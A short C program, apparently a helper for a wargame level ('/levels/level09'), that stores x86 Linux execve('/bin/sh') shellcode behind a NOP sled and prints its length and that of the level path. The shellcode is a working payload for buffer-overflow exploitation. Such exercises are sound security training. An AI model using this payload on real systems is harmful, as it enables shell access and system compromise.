#include <stdio.h>
#include <string.h>

int main() {
	char shell[] = "\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
	char tmp[] = "/levels/level09";
	printf("length shell: %d\n", strlen(shell));
	printf("length path: %d\n", strlen(tmp));
	return 0;
}
